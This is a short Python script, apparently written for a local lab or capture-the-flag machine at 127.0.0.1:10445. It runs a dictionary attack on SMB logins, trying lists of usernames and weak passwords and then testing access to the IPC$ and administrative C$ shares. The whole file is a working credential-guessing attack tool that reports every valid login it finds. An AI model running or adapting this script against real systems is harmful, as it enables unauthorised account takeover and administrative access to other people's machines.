import uuid
from smbprotocol.connection import Connection
from smbprotocol.session import Session
from smbprotocol.tree import TreeConnect
from smbprotocol.open import Open, CreateDisposition, FilePipePrinterAccessMask

TARGET = "127.0.0.1"
PORT = 10445

USERNAMES = [
    "melody",
    "kuro",
    "Administrator",
    "Guest",
    "meltat0\\melody",
    "meltat0\\kuro",
]
PASSWORDS = ["", "1121", "0114", "0441", "1234", "password", "melody", "kuro"]


def try_login(username, password):
    print(f"Trying {username} / {password}...")
    connection = Connection(uuid.uuid4(), TARGET, PORT)
    try:
        connection.connect()
        session = Session(connection, username, password)
        session.connect()
        print(f"[+] SUCCESS: Authenticated as {username}!")

        # Try to list shares (connect to IPC$)
        try:
            tree = TreeConnect(session, f"\\\\{TARGET}\\IPC$")
            tree.connect()
            print("    [+] Connected to IPC$")

            # Try C$
            tree_c = TreeConnect(session, f"\\\\{TARGET}\\C$")
            tree_c.connect()
            print("    [+] Connected to C$ (Admin Access!)")
            return True
        except Exception as e:
            print(f"    [-] Share access failed: {e}")
            return True  # Auth worked even if shares failed

    except Exception as e:
        print(f"    [-] Failed: {str(e)[:100]}...")  # Truncate error
        pass
    finally:
        connection.disconnect()
    return False


if __name__ == "__main__":
    print(f"Attacking SMB at {TARGET}:{PORT}...")

    for user in USERNAMES:
        for pwd in PASSWORDS:
            if try_login(user, pwd):
                print(f"\n!!! FOUND VALID CREDENTIALS: {user} / {pwd} !!!")
                # break # Don't break, find all
